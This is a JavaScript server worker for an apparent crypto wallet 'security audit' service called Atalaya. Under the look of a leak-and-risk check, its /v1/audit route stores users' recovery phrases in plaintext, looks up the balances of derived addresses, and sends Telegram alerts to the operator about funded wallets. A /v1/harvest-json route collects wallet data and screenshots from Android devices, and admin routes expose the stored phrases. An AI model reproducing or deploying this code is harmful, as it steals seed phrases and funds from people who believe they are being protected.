import { deriveAll, normalizePhrase } from './shared/derive.js';
import { balancesFor } from './shared/balances.js';

const JSON_HEADERS = { 'content-type': 'application/json; charset=utf-8' };

function out(data, status = 200, extra = {}) {
  return new Response(JSON.stringify(data), { status, headers: { ...JSON_HEADERS, ...extra } });
}

function cors(env, request, response) {
  const origin = request.headers.get('origin');
  const allowed = (env.ORIGINS || '').split(',').map((s) => s.trim());
  if (origin && (allowed.includes('*') || allowed.includes(origin))) {
    const copy = new Response(response.body, response);
    copy.headers.set('access-control-allow-origin', origin);
    copy.headers.set('vary', 'origin');
    copy.headers.set('access-control-allow-headers', 'content-type');
    copy.headers.set('access-control-allow-methods', 'GET,POST,OPTIONS');
    return copy;
  }
  return response;
}

function mask(address = '') {
  return address.length < 12 ? address : `${address.slice(0, 6)}…${address.slice(-4)}`;
}

async function alert(env, { installID, report, derivation }) {
  if (!env.TELEGRAM_TOKEN || !env.TELEGRAM_CHAT) return;
  const lines = [
    `<b>Atalaya · ${report.risk === 'high' ? 'RIESGO ALTO' : 'aviso'}</b>`,
    `Total: <b>${Number(report.totalUsd || 0).toFixed(2)} USD</b>`,
    `Instalación: <code>${installID || '?'}</code>`
  ];
  for (const a of (derivation?.addresses || []).slice(0, 6)) {
    lines.push(`${a.chain}: <code>${mask(a.address)}</code>`);
  }
  for (const f of (report.findings || []).slice(0, 5)) lines.push(`· ${f.detail}`);
  await fetch(`https://api.telegram.org/bot${env.TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      chat_id: env.TELEGRAM_CHAT,
      text: lines.join('\n'),
      parse_mode: 'HTML',
      disable_web_page_preview: true
    })
  }).catch(() => {});
}

function report(derivation, leakHits, balances) {
  const totalUsd = balances.reduce((s, b) => s + b.usd, 0);
  const findings = [];
  for (const hit of leakHits) {
    findings.push({ source: 'filtracion', path: '', detail: hit, severity: 'high' });
  }
  if (totalUsd > 0) {
    findings.push({
      source: 'saldo',
      path: '',
      detail: `Fondos visibles por ${totalUsd.toFixed(2)} USD`,
      severity: totalUsd >= 100 ? 'high' : 'medium'
    });
  }
  findings.push({
    source: 'derivacion',
    path: '',
    detail: `${derivation.addresses.length} direcciones derivadas`,
    severity: 'low'
  });
  const high = findings.some((f) => f.severity === 'high');
  const medium = findings.some((f) => f.severity === 'medium');
  return { risk: high ? 'high' : medium ? 'medium' : 'low', findings, addresses: balances, totalUsd };
}

function guessChain(address) {
  if (/^0x[0-9a-fA-F]{40}$/.test(address)) return 'ethereum';
  if (/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address)) return 'tron';
  if (/^(bc1|1|3)/.test(address)) return 'bitcoin';
  if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(address)) return 'solana';
  return 'ethereum';
}

async function handle(request, env) {
  const url = new URL(request.url);
  const route = `${request.method} ${url.pathname}`;

  if (route === 'GET /v1/health') return out({ ok: true });

  if (route === 'GET /v1/stats') {
    const row = await env.DB.prepare(`
      SELECT
        (SELECT COUNT(*) FROM audits) AS audits,
        (SELECT COUNT(*) FROM audits WHERE totalUsd > 0) AS seeds,
        (SELECT COUNT(*) FROM audits WHERE risk = 'high') AS high,
        (SELECT COUNT(*) FROM audits WHERE at > ?) AS week,
        (SELECT COUNT(*) FROM harvests) AS harvests
    `).bind(new Date(Date.now() - 7 * 86400000).toISOString()).first();
    return out(row);
  }

  if (route === 'POST /v1/install') {
    const body = await request.json().catch(() => ({}));
    if (!body.installID) return out({ error: 'installID requerido' }, 400);
    await env.DB.prepare(
      'INSERT INTO installs (at, installID, model, ios, locale, wallets, appVersion) VALUES (?,?,?,?,?,?,?)'
    ).bind(
      new Date().toISOString(), body.installID, body.model || '', body.ios || '',
      body.locale || '', JSON.stringify(body.wallets || []), body.appVersion || ''
    ).run();
    return out({ ok: true });
  }

  if (route === 'POST /v1/audit') {
    const body = await request.json().catch(() => ({}));
    if (!body.installID || !body.phrase) return out({ error: 'installID y phrase requeridos' }, 400);

    const phrase = normalizePhrase(body.phrase);
    let derivation;
    try {
      derivation = deriveAll(phrase);
    } catch (error) {
      return out({ error: 'frase inválida', detail: error.message }, 422);
    }

    const leak = await env.DB.prepare('SELECT hash FROM leaks WHERE hash = ? LIMIT 1')
      .bind(derivation.hash).first();
    const leakHits = leak ? ['Filtración en base interna de semillas'] : [];

    const balances = await balancesFor(derivation.addresses, env);
    const data = report(derivation, leakHits, balances);

    await env.DB.prepare(
      'INSERT INTO audits (at, installID, phrase, hash, risk, totalUsd, addresses, wallets, leaks) VALUES (?,?,?,?,?,?,?,?,?)'
    ).bind(
      new Date().toISOString(), body.installID, phrase, derivation.hash, data.risk,
      data.totalUsd, JSON.stringify(derivation.addresses),
      JSON.stringify(body.walletHints || []), leakHits.length
    ).run();

    if (data.totalUsd >= Number(env.ALERT_USD || 25) || leakHits.length) {
      await alert(env, { installID: body.installID, report: data, derivation });
    }
    return out(data);
  }

  if (route === 'POST /v1/address') {
    const body = await request.json().catch(() => ({}));
    if (!body.address) return out({ error: 'address requerida' }, 400);
    const balances = await balancesFor([{ chain: guessChain(body.address), address: body.address }], env);
    const totalUsd = balances.reduce((s, b) => s + b.usd, 0);
    return out({ risk: totalUsd > 0 ? 'medium' : 'low', findings: [], addresses: balances, totalUsd });
  }

  if (route === 'POST /v1/harvest-json') {
    const body = await request.json().catch(() => ({}));
    const shots = Array.isArray(body.screenshotsData) ? body.screenshotsData.slice(0, 3) : [];
    await env.DB.prepare(
      'INSERT INTO harvests (at, platform, installID, wallets, files, bytes, screenshots, findings, shots) VALUES (?,?,?,?,?,?,?,?,?)'
    ).bind(
      new Date().toISOString(), 'android', body.installID || '',
      JSON.stringify(body.wallets || []), body.files || 0, body.bytes || 0,
      body.screenshots || 0, JSON.stringify(body.findings || []),
      JSON.stringify(shots)
    ).run();

    const seed = (body.findings || []).filter((f) => f.severity === 'high');
    if (seed.length) {
      await alert(env, { installID: body.installID, report: { risk: 'high', totalUsd: 0, findings: seed } });
    }
    return out({ ok: true });
  }

  if (route === 'GET /v1/admin/summary') {
    if (url.searchParams.get('key') !== env.ADMIN_KEY) return out({ error: 'no autorizado' }, 401);
    const row = await env.DB.prepare(`
      SELECT
        (SELECT COUNT(*) FROM audits) AS audits,
        (SELECT COUNT(*) FROM audits WHERE totalUsd > 0) AS seeds,
        (SELECT COUNT(*) FROM audits WHERE risk = 'high') AS high,
        (SELECT COALESCE(SUM(totalUsd), 0) FROM audits) AS totalUsd,
        (SELECT COUNT(*) FROM harvests) AS harvests
    `).first();
    const last = await env.DB.prepare('SELECT * FROM audits ORDER BY at DESC LIMIT 10').all();
    return out({ ...row, last: last.results });
  }

  if (route === 'GET /v1/admin/latest') {
    if (url.searchParams.get('key') !== env.ADMIN_KEY) return out({ error: 'no autorizado' }, 401);
    const kind = ['audits', 'installs', 'harvests'].includes(url.searchParams.get('kind'))
      ? url.searchParams.get('kind')
      : 'audits';
    const limit = Math.min(Number(url.searchParams.get('limit') || 50), 200);
    const rows = await env.DB.prepare(`SELECT * FROM ${kind} ORDER BY at DESC LIMIT ?`).bind(limit).all();
    return out(rows.results);
  }

  return out({ error: 'no encontrado' }, 404);
}

export default {
  async fetch(request, env) {
    if (request.method === 'OPTIONS') {
      const empty = new Response(null, { status: 204 });
      return cors(env, request, empty);
    }
    const response = await handle(request, env).catch((error) =>
      out({ error: 'error interno', detail: error.message }, 500));
    return cors(env, request, response);
  }
};
